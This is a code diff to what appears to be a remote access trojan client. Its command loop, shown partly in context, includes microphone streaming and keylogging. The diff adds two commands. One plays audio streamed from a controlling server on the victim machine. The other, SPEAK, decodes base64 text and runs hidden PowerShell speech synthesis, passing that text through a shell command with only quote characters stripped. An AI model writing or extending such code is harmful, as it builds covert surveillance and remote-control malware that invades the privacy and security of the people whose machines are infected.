@@ -1903,6 +1903,93 @@ def main_loop():
                             output = stop_mic_stream().encode()
                         except Exception as e:
                             output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
+
+                    elif cmd == "VOICE_STREAM_START":
+                        try:
+                            import sounddevice as sd
+                            import numpy as np
+                            import struct
+                            
+                            # Let the server know we are ready
+                            with client_lock:
+                                client.sendall(json.dumps({"type": "VOICE_STREAM", "status": "ready"}).encode())
+                            
+                            audio_stream = None
+                            try:
+                                # Open audio output stream
+                                sample_rate = 24000
+                                channels = 1
+                                audio_stream = sd.OutputStream(samplerate=sample_rate, channels=channels, dtype='int16')
+                                audio_stream.start()
+                                
+                                # Enter voice stream loop
+                                client.settimeout(10.0)
+                                while True:
+                                    len_bytes = client.recv(4)
+                                    if not len_bytes or len(len_bytes) < 4:
+                                        break
+                                    L = struct.unpack("!I", len_bytes)[0]
+                                    if L == 0:
+                                        break
+                                    
+                                    # Read exactly L bytes
+                                    data_chunk = b""
+                                    while len(data_chunk) < L:
+                                        to_read = L - len(data_chunk)
+                                        chunk = client.recv(to_read)
+                                        if not chunk:
+                                            break
+                                        data_chunk += chunk
+                                    
+                                    if len(data_chunk) < L:
+                                        break
+                                    
+                                    # Play chunk
+                                    audio_arr = np.frombuffer(data_chunk, dtype=np.int16)
+                                    audio_stream.write(audio_arr)
+                            finally:
+                                if audio_stream is not None:
+                                    try:
+                                        audio_stream.stop()
+                                        audio_stream.close()
+                                    except:
+                                        pass
+                                try:
+                                    client.settimeout(None)
+                                except:
+                                    pass
+                                    
+                            output = json.dumps({"type": "VOICE_STREAM", "status": "success", "message": "Voice stream ended"}).encode()
+                        except Exception as e:
+                            output = json.dumps({"type": "VOICE_STREAM", "status": "error", "message": str(e)}).encode()
+
+                    elif cmd.startswith("SPEAK:"):
+                        try:
+                            text = cmd.split(":", 1)[1].strip()
+                            if text.startswith("B64~"):
+                                import base64
+                                text = base64.urlsafe_b64decode(text[4:].encode("ascii")).decode("utf-8")
+                            
+                            # Run SAPI / System.Speech
+                            def _speak():
+                                if platform.system() == "Windows":
+                                    try:
+                                        import subprocess
+                                        clean_txt = text.replace("'", "").replace('"', "")
+                                        ps_cmd = (
+                                            'powershell -Command "Add-Type -AssemblyName System.Speech; '
+                                            '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
+                                            '$synth.Rate = 0; '
+                                            f'$synth.Speak(\'{clean_txt}\')"'
+                                        )
+                                        subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
+                                    except Exception as ex:
+                                        print(f"Speak error: {ex}")
+                                        
+                            threading.Thread(target=_speak, daemon=True).start()
+                            output = json.dumps({"type": "SPEAK", "status": "success", "message": "Spoken on client speaker successfully"}).encode()
+                        except Exception as e:
+                            output = json.dumps({"type": "SPEAK", "status": "error", "message": str(e)}).encode()
                     
                     elif cmd == "KEYLOG_START":
                         try:
